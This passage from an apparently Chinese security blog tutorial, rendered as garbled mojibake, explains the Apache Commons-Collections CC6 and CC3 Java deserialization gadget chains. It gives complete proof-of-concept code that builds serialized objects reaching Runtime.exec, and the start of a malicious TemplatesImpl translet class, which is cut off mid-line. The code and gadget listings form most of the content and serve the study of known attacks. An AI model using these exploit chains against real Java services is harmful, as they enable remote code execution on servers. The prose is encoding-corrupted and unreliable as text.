ä¸ºCC2çš„ç‰¹ç‚¹è·Ÿå‰é¢CC1æ¥ä¸ä¸Šï¼Œä½†æ˜¯CC6å¯ä»¥é¡ºå»¶å¾€ä¸‹è®²ï¼Œä¸Šé¢è¯´åˆ°<strong>Jdk8u71</strong>å¼•å…¥çš„<code>LinkedHashMap</code>è®©CC1å¤±æ•ˆï¼Œè€ŒCC6å…‹æœäº†è¿™ä¸€ç‚¹ï¼Œè„±èƒäºCC1ï¼Œæˆä¸ºJava8ç³»åˆ—å¸¸è§çš„åŸç”Ÿé“¾ã€‚</p><p>CC6é“¾å­ååŠæ®µè¿˜æ˜¯ä½¿ç”¨CC1çš„<code>LazyMap</code>ï¼Œç”±äº<code>AnnotationInvocationHandler</code>å› Javaç‰ˆæœ¬è€Œåˆ©ç”¨å—é™ï¼Œéœ€è¦æ‰¾å¯»å…¶ä»–å¯ä»¥è°ƒç”¨<code>LazyMap#get</code>çš„åœ°æ–¹ã€‚</p><p>è¿™é‡Œåˆè¦å¼•å…¥ä¸€ä¸ªå®Œç¾è§£å†³è¿™ä¸ªé—®é¢˜çš„ç±»äº†ï¼Œæ¥ä¸‹æ¥èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.commons.collections.keyvalue.TiedMapEntry<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> key;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>        <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>               (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ˜¾è€Œæ˜“è§çš„æ˜¯<code>getValue</code>éƒ¨åˆ†è°ƒç”¨äº†<code>get</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå°±æœ‰é“¾å­ï¼š</p><p><code>hashCode()</code> &#x3D;&gt; <code>getValue()</code> &#x3D;&gt; <code>map.get(key)</code></p><p>hashCodeæ˜¯åœ¨URLDNSä¸­ä¹Ÿç”¨åˆ°çš„ï¼Œä½œä¸ºä¸€ä¸ªè®¿é—®DNSçš„è§¦å‘å™¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// HashMap#readObject</span><br><span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#hash</span><br><span class="hljs-comment">// è°ƒç”¨hashæ˜¯ä¸ºä¿è¯é”®çš„å”¯ä¸€æ€§</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-comment">// ====================================================================</span><br><span class="hljs-comment">// HashMap#put</span><br><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªé“¾ï¼š</p><p><code>readObject()</code> &#x3D;&gt; <code>hash(key)</code> &#x3D;&gt; <code>key.hashCode()</code></p><p>æ‰€ä»¥æˆ‘ä»¬å°±èƒ½å¾—å‡ºï¼Œåœ¨è¿™é‡Œè®©<strong>key &#x3D;&#x3D; TiedMapEntryå¯¹è±¡</strong>ï¼Œå°±èƒ½å®Œç¾è¿æ¥èµ·æ¥å‰é¢çš„é“¾å­äº†ã€‚</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>HashSet#readObject()<br>HashMap#put()<br>HashMap#hash()<br>TiedMapEntry#hashCode()<br>TiedMapEntry#getValue()<br>LazyMap#get()<br>                                <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>      ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>åˆä»£ç›®ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><br><span class="hljs-comment">// fake_payload</span><br>Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>    <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-comment">// putçš„æ—¶å€™ä¹Ÿä¼šæ‰§è¡ŒhashCodeï¼Œä¸ºäº†é˜²æ­¢æœ¬åœ°è°ƒè¯•è§¦å‘payloadï¼Œè¿™é‡Œæ”¾å…¥fake_payload</span><br>expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br><span class="hljs-comment">// å°†çœŸæ­£çš„transformersæ•°ç»„è®¾ç½®è¿›æ¥</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>oos.writeObject(expMap);<br>oos.close();<br><br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ˜¯æ²¡åŠæ³•ç›´æ¥ååºåˆ—åŒ–çš„ã€‚</p><p>å½“æˆ‘ä»¬æ‰§è¡Œ<code>Map.put()</code>çš„æ—¶å€™ä¼šè§¦å‘<code>hash()</code>ï¼Œè¿›è€Œç‰µåŠ¨æ•´æ¡é“¾ã€‚</p><p>å†æ¥çœ‹<code>LazyMap</code>çš„<code>get()</code>ï¼Œç”±äºæ˜¯æ‡’åŠ è½½å› æ­¤å¾—åˆ°å½“å‰mapä¸­æ²¡æœ‰keyï¼Œæ‰ä¼šæ»¡è¶³é‚£ä¸ªifæ¡ä»¶å†è°ƒç”¨åˆ°<code>factory.transform(key)</code>ç”Ÿæˆvalueï¼Œå†<code>map.put(key, value)</code>ï¼Œè¿™æ—¶å€™<code>lazyMap</code>ä¸­å°±æœ‰keyäº†ã€‚ï¼ˆè¿™é‡Œçš„keyæ˜¯<code>new TiedMapEntry</code>ä¼ å…¥çš„keyï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// LazyMap#get</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦æƒ³åŠæ³•æŠŠè¿™ä¸ªé”®å€¼å¯¹ä»<code>LazyMap</code>ä¸­ç§»é™¤å°±è¡Œï¼Œå³<code>lazyMap.remove(&quot;test&quot;);</code></p><p>Final CC6-POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728211545706.png" alt="image-20240728211545706"></p><p>åˆ’æ—¶ä»£çš„æ„ä¹‰ã€‚</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>CC4æ¶‰åŠåˆ°æ›´æ–°çš„Commons-Collections4ï¼Œæ‰€ä»¥ç•™åˆ°åé¢è®²ï¼Œè€ŒCC3åŒæ ·å…·æœ‰åˆ’æ—¶ä»£çš„æ„ä¹‰ï¼Œå› ä¸ºå®ƒçš„é€»è¾‘ç”¨åˆ°çš„æ˜¯æ¶æ„å­—èŠ‚ç ï¼Œè¿™å¯¹äºJavaååºåˆ—åŒ–æ¥è¯´æ˜¯ä¸ªå¾ˆå¸¸è§çš„Attackæ–¹å¼ã€‚</p><p>é¦–å…ˆéœ€è¦ä»‹ç»çš„æ˜¯JavaåŠ¨æ€åŠ è½½å­—èŠ‚ç çš„ä¸œè¥¿ã€‚</p><p>ä½ å¯èƒ½ä¼šçœ‹åˆ°å¾ˆå¤šæ¬¡ <code>Gadgets.createTemplatesImpl(command)</code> ï¼Œå¦å¤–ä½ ä¹Ÿè®¸æ›¾åœ¨<code>fastjson</code>ç­‰æ¼æ´çš„åˆ©ç”¨ä¸­çœ‹åˆ°è¿‡<code>TemplatesImpl</code>è¿™ä¸ªç±»ï¼Œå®ƒç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Œä¸ºä½•å‡ºé•œç‡è¿™ä¹ˆé«˜å‘¢ï¼Ÿ</p><p>å­—èŠ‚ç æ˜¯ä»€ä¹ˆå°±ä¸åšè¿‡å¤šè¯´æ˜ï¼Œè¿™ä¸Javaä½œä¸ºé™æ€è¯­è¨€è€Œä¸”èƒ½å¤Ÿâ€œä¸€æ¬¡ç¼–è¯‘ï¼Œåˆ°å¤„è¿è¡Œâ€çš„å®—æ—¨æœ‰å…³ã€‚</p><p>åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ä¹Ÿå¾ˆå¤šï¼Œè¿™é‡Œå…ˆä¸ä»‹ç»äº†ï¼Œåé¢ä¼šå•å¼€ä¸€ç« æ¥è®²è®²ã€‚</p><p>è¨€å½’æ­£ä¼ ï¼ŒCC3è¿™é‡Œçš„èƒŒæ™¯æ˜¯ä¸€ä¸ªQuestionï¼ŒCC1å’ŒCC6çš„sinkéƒ½åœ¨<code>InvokerTransformer</code>ä¸Šï¼Œè‹¥WAFç›´æ¥ç¦ç”¨äº†è¯¥ç±»ï¼Œæ˜¯å¦å°±æ‹¿å®ƒæ²¡æ³•äº†ï¼Ÿ</p><p>å½“ç„¶ä¸æ˜¯ã€‚ä½†è¿™é‡Œå°±åˆè¦è¯·å‡ºå¦ä¸€ä¸ªè§£å†³è¿™ä¸ªé—®é¢˜çš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter<br></code></pre></td></tr></table></figure><p><strong>â€œæˆ‘æ‰“å®¿å‚©ï¼ŸçœŸçš„å‡çš„ï¼Ÿâ€</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span><br>    TransformerConfigurationException<br>&#123;<br>    _templates = templates;<br>    _transformer = (TransformerImpl) templates.newTransformer();<br>    _transformerHandler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerHandlerImpl</span>(_transformer);<br>    _useServicesMechanism = _transformer.useServicesMechnism();<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆåˆ†æä¸€ä¸‹è¿™ä¸ª<code>TrAXFilter</code>ã€‚</p><p>è¯¥ç±»æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†<code>(TransformerImpl) templates.newTransformer()</code></p><p><code>TransformerImpl</code>åœ¨åŠ è½½å­—èŠ‚ç çš„å¾ˆå¤šæ–‡ç« é‚£é‡Œæè¿‡ï¼Œ<code>newTransformer</code>æœ€åèƒ½è°ƒç”¨åˆ°<code>defineClass()</code>åŠ è½½æ¶æ„å­—èŠ‚ç ã€‚</p><p>ä½†æ˜¯ç›®å‰çœ‹æ¥å¦‚æœæ²¡æœ‰<code>InvokerTransfomer</code>ï¼Œ<code>TrAXFilter</code>çš„æ„é€ æ–¹æ³•ä¹Ÿæ— æ³•è°ƒç”¨</p><p>è¿™é‡Œè¦ç”¨åˆ°æ–°çš„<code>Transformer</code>å®ç°ç±»<code>InstantiateTransformer</code>ï¼Œçœ‹çœ‹å®ƒçš„<code>transform</code>ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯è°ƒç”¨æ„é€ å‡½æ•°ï¼Œè¿”å›ç±»å®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-comment">//....</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">con</span> <span class="hljs-operator">=</span> ((Class) input).getConstructor(iParamTypes);<br>    <span class="hljs-keyword">return</span> con.newInstance(iArgs);<br>    <span class="hljs-comment">//....</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>AnnotationInvocationHandler#readObject()<br>Map(Proxy)#entrySet()<br>AnnotationInvocationHandler#invoke()<br>LazyMap#get()<br>ChainedTransformer#transform()<br>InstantiateTransformer#transform()<br>    TrAXFilter#TrAXFilter()<br>TemplatesImpl#newTransformer()<br>TemplatesImpl#getTransletInstance()<br>TemplatesImpl#defineTransletClasses()<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç”¨åˆ°<code>javassist</code>æ¥è·å–å­—èŠ‚ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.29.2-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>Evil.class</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span 